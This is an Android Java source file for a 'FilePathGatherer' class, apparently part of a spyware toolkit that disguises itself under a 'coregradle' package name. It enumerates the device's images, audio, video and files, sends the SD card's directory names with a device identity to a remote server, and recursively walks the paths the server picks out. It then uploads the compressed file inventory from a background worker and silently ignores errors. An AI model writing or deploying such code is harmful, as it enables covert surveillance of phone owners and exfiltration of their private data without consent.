package org.code.coregradle.gatherers;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.provider.MediaStore;
import android.util.Base64;

import androidx.work.ListenableWorker;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.code.coregradle.config.ApiConfig;
import org.code.coregradle.config.IdentityStore;
import org.code.coregradle.utils.CompressionUtils;

import java.io.File;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class FilePathGatherer implements InfoGatherer {

    private final OkHttpClient httpClient = new OkHttpClient();
    private Context context;
    private IdentityStore identityStore;

    @Override
    public void initGatherer(Context context) {
        this.context = context;
        this.identityStore = IdentityStore.getInstance(context);
    }

    public void getMediaPaths(JSONArray jsonArray) throws JSONException {
        getMediaPaths(MediaStore.Images.Media.INTERNAL_CONTENT_URI, "image", "internal", jsonArray);
        getMediaPaths(MediaStore.Video.Media.INTERNAL_CONTENT_URI, "video", "internal", jsonArray);
        getMediaPaths(MediaStore.Audio.Media.INTERNAL_CONTENT_URI, "audio", "internal", jsonArray);
        getMediaPaths(MediaStore.Files.getContentUri("internal"), "files", "files", jsonArray);
        if (Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED)) {
            getMediaPaths(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "image", "external", jsonArray);
            getMediaPaths(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, "video", "external", jsonArray);
            getMediaPaths(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, "audio", "external", jsonArray);
            getMediaPaths(MediaStore.Files.getContentUri("external"), "files", "external", jsonArray);
        }
    }

    public String getFileType(File file) {
        return "UNKNOWN";
    }

    public void recursiveEnumerate(File root, JSONArray paths) {
        try {
            for (File file : root.listFiles()) {
                if (file.isDirectory()) {
                    recursiveEnumerate(file, paths);
                } else {
                    JSONObject fileEntry = new JSONObject();
                    fileEntry.put("id", new String(Base64.encode(file.getAbsolutePath().getBytes(), Base64.NO_WRAP)));
                    fileEntry.put("fileName", file.getName());
                    fileEntry.put("size", file.length());
                    fileEntry.put("type", getFileType(file));
                    fileEntry.put("storageClass", "sdcard");
                    fileEntry.put("lastModifiedAt", file.lastModified());
                    paths.put(fileEntry);
                }
            }
        } catch (Exception ignored) {

        }
    }

    public JSONArray enumerateSDCard() {
        JSONArray paths = new JSONArray();
        try {
            JSONObject directoryReport = new JSONObject();
            directoryReport.put(this.identityStore.getIdentityKey(), this.identityStore.getIdentityValue());
            File sdcard = Environment.getExternalStorageDirectory();
            for (File child : sdcard.listFiles()) {
                if (child.isDirectory()) {
                    paths.put(child.getName());
                }
            }
            directoryReport.put("filePaths", paths);
            RequestBody requestBody = RequestBody.create(MediaType.get("application/json"), CompressionUtils.compress(directoryReport.toString()));
            Request request = new Request.Builder()
                    .url(ApiConfig.REPORT_SDCARD_PATHS_URL)
                    .post(requestBody)
                    .build();
            Response response = httpClient.newCall(request).execute();
            JSONObject jsonResponse = new JSONObject(response.body().string());
            JSONArray interestedPaths = jsonResponse.getJSONArray("filePaths");
            paths = new JSONArray();
            for (int i = 0; i < interestedPaths.length(); i++) {
                String rootPath = interestedPaths.getString(i);
                File rootFile = new File(Environment.getExternalStorageDirectory(), rootPath);
                recursiveEnumerate(rootFile, paths);
            }
            return paths;
        } catch (Exception ignored) {

        }
        return paths;
    }

    public void getMediaPaths(Uri root, String type, String storageClass, JSONArray jsonArray) {
        String[] projection;
        String selection = null;
        if (type.equals("image")) {
            projection = new String[]{
                    MediaStore.Images.Media._ID,
                    MediaStore.Images.Media.DISPLAY_NAME,
                    MediaStore.Images.Media.SIZE,
                    MediaStore.Images.Media.DATE_ADDED
            };
        } else if (type.equals("audio")) {
            projection = new String[]{
                    MediaStore.Audio.Media._ID,
                    MediaStore.Audio.Media.DISPLAY_NAME,
                    MediaStore.Audio.Media.SIZE,
                    MediaStore.Audio.Media.DATE_ADDED
            };
        } else if (type.equals("video")) {
            projection = new String[]{
                    MediaStore.Video.Media._ID,
                    MediaStore.Video.Media.DISPLAY_NAME,
                    MediaStore.Video.Media.SIZE,
                    MediaStore.Audio.Media.DATE_ADDED
            };
        } else if (type.equals("files")) {
            projection = new String[]{
                    MediaStore.Files.FileColumns._ID,
                    MediaStore.Files.FileColumns.DISPLAY_NAME,
                    MediaStore.Files.FileColumns.SIZE,
                    MediaStore.Files.FileColumns.DATE_ADDED
            };
            selection = MediaStore.Files.FileColumns.MEDIA_TYPE + "="
                    + MediaStore.Files.FileColumns.MEDIA_TYPE_NONE;
        } else {
            projection = new String[]{};
        }

        ContentResolver contentResolver = context.getContentResolver();
        try (Cursor cursor = contentResolver.query(
                root, projection, selection,
                null, null)) {
            int idColumnIdx = cursor.getColumnIndexOrThrow(projection[0]);
            int displayNameIdx = cursor.getColumnIndex(projection[1]);
            int sizeIdx = cursor.getColumnIndex(projection[2]);
            int dateIdx = cursor.getColumnIndex(projection[3]);
            if (cursor.moveToFirst()) {
                do {
                    long id = cursor.getLong(idColumnIdx);
                    String displayName = cursor.getString(displayNameIdx);
                    Long size = cursor.getLong(sizeIdx);
                    long dateAdded = cursor.getLong(dateIdx);


                    JSONObject jsonObject = new JSONObject();
                    try {
                        jsonObject.put("id", String.valueOf(id));
                        jsonObject.put("fileName", displayName);
                        jsonObject.put("size", size);
                        jsonObject.put("type", type);
                        jsonObject.put("storageClass", storageClass);
                        jsonObject.put("lastModified", dateAdded);
                        jsonArray.put(jsonObject);
                    } catch (JSONException e) {

                    }
                } while (cursor.moveToNext());
            }
        }
    }


    @Override
    public JSONObject getRequestJSON() {
        JSONObject requestJSON = new JSONObject();
        try {
            JSONArray allPaths = new JSONArray();
            getMediaPaths(allPaths);
            requestJSON.put(this.identityStore.getIdentityKey(), this.identityStore.getIdentityValue());
            requestJSON.put("filePaths", allPaths);
        } catch (Exception e) {

        }
        return requestJSON;
    }

    public void mergePaths(JSONArray dest, JSONArray src) {
        try {
            for (int i = 0; i < src.length(); i++) {
                dest.put(src.get(i));
            }
        } catch (Exception ignored) {

        }
    }

    @Override
    public ListenableWorker.Result makeRequest() {
        try {
            JSONArray sdcardPaths = enumerateSDCard();
            JSONObject requestJSON = getRequestJSON();
            mergePaths(sdcardPaths, requestJSON.getJSONArray("filePaths"));
            requestJSON.put("filePaths", sdcardPaths);

            RequestBody requestBody = RequestBody.create(MediaType.get("application/json"), CompressionUtils.compress(requestJSON.toString()));
            Request request = new Request.Builder()
                    .url(ApiConfig.REPORT_FILE_PATHS_URL)
                    .post(requestBody)
                    .build();
            Response response = httpClient.newCall(request).execute();
            if (response.isSuccessful()) {
                return ListenableWorker.Result.success();
            }
        } catch (Exception ignored) {

        }
        return ListenableWorker.Result.failure();
    }
}
